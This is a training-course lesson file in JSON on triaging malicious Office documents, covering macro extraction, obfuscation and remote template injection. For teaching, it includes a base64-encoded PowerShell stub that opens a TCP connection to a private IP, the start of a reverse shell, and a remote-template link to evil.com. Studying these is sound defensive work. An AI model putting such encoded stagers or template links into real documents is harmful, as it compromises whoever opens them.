@@ -1,0 +1,75 @@
+{
+    "id": "l4",
+    "chapterId": "ch_9",
+    "title": "Analyzing Malicious Office Documents",
+    "description": "Extract and decode VBA macros, identify download cradles and PowerShell stagers.",
+    "xpReward": 35,
+    "estimatedMinutes": 8,
+    "section": "File Types",
+    "slides": [
+        {
+            "id": "s_l4_1",
+            "type": "text",
+            "title": "Maldocs: The Silent Killers 📄",
+            "content": "# Why Office Documents Are Dangerous\n\nMicrosoft Word, Excel, and PowerPoint support **VBA Macros**—small programs that automate tasks. Attackers abuse macros to download and execute malware.\n\n**Common Maldoc Extensions:**\n*   `.docm`, `.xlsm`, `.pptm` (Macro-enabled files).\n*   `.doc`, `.xls` (Legacy format, can contain macros).\n\n**The Attack Chain:**\n1.  User opens document, clicks **\"Enable Content\"** (Enable Macros).\n2.  Macro executes `AutoOpen()` or `Document_Open()` function.\n3.  Macro runs a **PowerShell command** to download malware from the internet.\n4.  Malware executes, user is compromised.\n\n**Analogy:** The document is the **Trojan Horse**. The macro is the **soldier hiding inside**."
+        },
+        {
+            "id": "s_l4_2",
+            "type": "code",
+            "title": "Tool: oledump.py",
+            "content": "OLE files (Office 97-2003 format) and newer Office Open XML files store macros in streams. `oledump.py` extracts them.\n\n```bash\n# List streams\npython oledump.py invoice.docm\n\n# Output:\n# A: word/vbaProject.bin\n#    A1:       450 'PROJECT'\n#    A2:       102 'PROJECTwm'\n#    A3: M    1234 'VBA/ThisDocument'   <-- 'M' means Macro!\n#    A4:      2500 'VBA/_VBA_PROJECT'\n\n# Extract macro code from stream A3\npython oledump.py -s A3 -v invoice.docm > macro.vba\n```",
+            "codeLanguage": "bash",
+            "canRunCode": false
+        },
+        {
+            "id": "s_l4_3",
+            "type": "quiz",
+            "title": "Maldoc Streams 📚",
+            "content": "",
+            "quizData": {
+                "id": "q_l4_1",
+                "type": "multiple_choice",
+                "question": "In oledump.py output, what does the 'M' flag next to a stream indicate?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "The stream is encrypted.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "The stream contains VBA Macro code.",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "The stream is an image.",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "'M' stands for Macro. These streams contain the VBA code that executes when macros are enabled.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l4_4",
+            "type": "code",
+            "title": "Deobfuscating Malicious Macros",
+            "content": "Attackers obfuscate macros to evade AV. They use string splitting, Chr() functions, and Base64.\n\n**Common Obfuscation Techniques:**\n\n1. **Chr() Concatenation:**\n   `\"p\" + \"o\" + \"w\" + \"e\" + \"r\" + \"s\" + \"h\" + \"e\" + \"l\" + \"l\"` = `powershell`\n\n2. **Reversed Strings:**\n   `StrReverse(\"llehsrewop\")` = `powershell`\n\n3. **Base64 in VBA:**\n   `shell = \"powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAiACwANAA0ADMANAApADsA\"`\n\n**Deobfuscation Strategy:**\n1.  Find the final execution string (usually `Shell()` or `WScript.Shell Run`).\n2.  Manually decode or use CyberChef.\n3.  Extract the **PowerShell command** and analyze it as per Lesson 5.",
+            "codeLanguage": "text",
+            "canRunCode": false
+        },
+        {
+            "id": "s_l4_5",
+            "type": "text",
+            "title": "Alternative: Remote Template Injection 📡",
+            "content": "# Maldocs Without Macros\n\nSome malicious documents don't contain macros. They use **Remote Template Injection**.\n\n**How it works:**\n1.  Word document contains a link to a **remote template** (`.dotm` file hosted on the internet).\n2.  When opened, Word downloads and executes the malicious template.\n\n**Detection:**\n*   Unzip the `.docx` file (it's a ZIP archive).\n*   Navigate to `word/_rels/settings.xml.rels`.\n*   Look for `Target=\"http://evil.com/template.dotm\"`.\n\n**Tool: `olevba`** (part of oletools) will detect remote templates automatically."
+        },
+        {
+            "id": "s_l4_6",
+            "type": "warning",
+            "title": "Never Enable Macros! 🛑",
+            "content": "## Even in a VM, Be Careful\n\nWhen analyzing maldocs dynamically, **disable the VM's network** or use **INetSim** first. You don't want the macro to download **real ransomware** from the internet and encrypt your analysis VM (which could escape to shared folders).\n\n**Best Practice:** Stick to **static extraction** (`oledump.py`, `olevba`) for 99% of SOC maldoc triage."
+        }
+    ]
+}
